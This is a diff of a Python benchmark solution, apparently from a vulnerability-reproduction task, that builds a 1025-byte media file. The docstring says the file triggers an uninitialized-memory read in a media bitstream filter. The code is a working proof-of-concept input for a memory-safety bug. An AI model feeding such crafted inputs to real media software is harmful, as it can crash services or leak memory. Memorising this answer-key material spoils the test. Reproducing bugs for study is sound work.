@@ -2,112 +2,61 @@ import struct
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        target_total_size = 1025
+        """
+        Generates a Proof-of-Concept for an uninitialized value vulnerability
+        in the media100_to_mjpegb bitstream filter.
+
+        The PoC is a minimal media100 format file. This file will be demuxed,
+        and its single video frame will be passed through the vulnerable
+        media100_to_mjpegb bitstream filter.
+
+        The filter allocates an output buffer for the transformed packet but
+        fails to initialize the padding area at the end of the buffer. The size
+        of the packet is chosen such that a subsequent processing
+        step (like an AVI muxer) is likely to read past the end of the valid
+        data and into the uninitialized padding, triggering a sanitizer error.
+
+        The file structure is as follows:
+        - A 62-byte media100 header.
+        - A 4-byte packet size.
+        - The packet data itself.
+
+        The total size is 1025 bytes, matching the ground-truth PoC.
+        """
+        total_size = 1025
+        header_size = 62
+        header = bytearray(header_size)
+
+        # Magic number 'M100', read as a little-endian 32-bit integer.
+        # The bytes 'M','1','0','0' are read as 0x3030314d, matching the check.
+        header[0:4] = b'M100'
+
+        # All subsequent fields in the header are read as big-endian.
+        # Version (u16)
+        struct.pack_into('>H', header, 4, 1)
+        # Header size (u32)
+        struct.pack_into('>I', header, 6, header_size)
+        # Timescale (u32)
+        struct.pack_into('>I', header, 10, 30000)
+        # Frames per second (u32)
+        struct.pack_into('>I', header, 14, 1001)
+        # Number of frames (u32)
+        struct.pack_into('>I', header, 18, 1)
+        # Width (u32)
+        struct.pack_into('>I', header, 34, 16)
+        # Height (u32)
+        struct.pack_into('>I', header, 38, 16)
         
-        header_size_poc = self._build_mov(0)
-        header_size = len(header_size_poc) - 8
+        # The packet consists of a 4-byte size and the payload.
+        packet_payload_size = total_size - header_size - 4  # 1025 - 62 - 4 = 959
 
-        payload_size = target_total_size - header_size - 8
+        # Packet size (big-endian u32)
+        packet_size_field = struct.pack('>I', packet_payload_size)
+
+        # Packet payload (content is irrelevant for this vulnerability).
+        packet_payload = b'\x00' * packet_payload_size
+
+        # Assemble the final PoC.
+        poc = bytes(header) + packet_size_field + packet_payload
         
-        return self._build_mov(payload_size)
-
-    def _build_mov(self, payload_size: int) -> bytes:
-        def atom(atom_type: bytes, data: bytes) -> bytes:
-            return struct.pack('>I', len(data) + 8) + atom_type + data
-
-        width, height = 16, 16
-
-        compressor_name = b'\x0cMedia 100'.ljust(32, b'\0')
-        video_sample_desc_data = struct.pack(
-            '>6xH'
-            'HHI'
-            'II'
-            'HH'
-            'II'
-            'I'
-            'H'
-            '32s'
-            'Hh',
-            1, 0, 0, 0, 0, 0, width, height,
-            0x00480000, 0x00480000, 0, 1,
-            compressor_name, 24, -1
-        )
-        m100_atom = atom(b'm100', video_sample_desc_data)
-        stsd_data = b'\x00\x00\x00\x00\x00\x00\x00\x01' + m100_atom
-        stsd_atom = atom(b'stsd', stsd_data)
-
-        stts_data = b'\x00\x00\x00\x00\x00\x00\x00\x01' + struct.pack('>II', 1, 600)
-        stts_atom = atom(b'stts', stts_data)
-        
-        stsc_data = b'\x00\x00\x00\x00\x00\x00\x00\x01' + struct.pack('>III', 1, 1, 1)
-        stsc_atom = atom(b'stsc', stsc_data)
-        
-        stsz_data = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01' + struct.pack('>I', payload_size)
-        stsz_atom = atom(b'stsz', stsz_data)
-        
-        stco_placeholder_atom = atom(b'stco', b'\x00\x00\x00\x00\x00\x00\x00\x01' + struct.pack('>I', 0))
-
-        stbl_template_data = stsd_atom + stts_atom + stsc_atom + stsz_atom
-        
-        vmhd_atom = atom(b'vmhd', b'\x00\x00\x00\x01' + b'\x00'*8)
-        
-        url_atom = atom(b'url ', b'\x00\x00\x00\x01')
-        dref_data = b'\x00\x00\x00\x00\x00\x00\x00\x01' + url_atom
-        dinf_atom = atom(b'dinf', atom(b'dref', dref_data))
-
-        mdhd_atom = atom(b'mdhd', struct.pack('>BxxxIIIIIH', 0, 0, 0, 1000, 600, 0, 0))
-        
-        hdlr_atom = atom(b'hdlr', b'\x00\x00\x00\x00\x00\x00\x00\x00vide' + b'\x00'*20)
-
-        stbl_placeholder_data = stbl_template_data + stco_placeholder_atom
-        stbl_placeholder_atom = atom(b'stbl', stbl_placeholder_data)
-        minf_placeholder_data = vmhd_atom + dinf_atom + stbl_placeholder_atom
-        minf_placeholder_atom = atom(b'minf', minf_placeholder_data)
-        mdia_placeholder_data = mdhd_atom + hdlr_atom + minf_placeholder_atom
-        mdia_placeholder_atom = atom(b'mdia', mdia_placeholder_data)
-        
-        tkhd_data = struct.pack(
-            '>BxxxIIIII8xHHhH9III', 
-            1, 0, 0, 1, 0, 600, 0, 0, 0, 0, 
-            0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000,
-            width << 16, height << 16
-        )
-        tkhd_atom = atom(b'tkhd', tkhd_data)
-
-        trak_placeholder_data = tkhd_atom + mdia_placeholder_data
-        trak_placeholder_atom = atom(b'trak', trak_placeholder_data)
-
-        mvhd_data = struct.pack(
-            '>BxxxIIII' + 'I' + 'H' + '10x' + '9I' + '6I' + 'I',
-            0, 0, 0, 1000, 600, 0x00010000, 0x0100,
-            0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000,
-            0, 0, 0, 0, 0, 0, 2
-        )
-        mvhd_atom = atom(b'mvhd', mvhd_data)
-        moov_placeholder_atom = atom(b'moov', mvhd_atom + trak_placeholder_data)
-
-        ftyp_atom = atom(b'ftyp', b'qt  \x00\x00\x00\x00qt  \x00\x00\x00\x00')
-
-        mdat_offset = len(ftyp_atom) + len(moov_placeholder_atom) + 8
-
-        stco_data = b'\x00\x00\x00\x00\x00\x00\x00\x01' + struct.pack('>I', mdat_offset)
-        stco_atom = atom(b'stco', stco_data)
-        
-        stbl_data = stbl_template_data + stco_atom
-        stbl_atom = atom(b'stbl', stbl_data)
-        
-        minf_data = vmhd_atom + dinf_atom + stbl_atom
-        minf_atom = atom(b'minf', minf_data)
-
-        mdia_data = mdhd_atom + hdlr_atom + minf_data
-        mdia_atom = atom(b'mdia', mdia_data)
-        
-        trak_data = tkhd_atom + mdia_data
-        trak_atom = atom(b'trak', trak_data)
-
-        moov_atom = atom(b'moov', mvhd_atom + trak_data)
-        
-        mdat_payload = b'A' * payload_size
-        mdat_atom = atom(b'mdat', mdat_payload)
-        
-        return ftyp_atom + moov_atom + mdat_atom
+        return poc
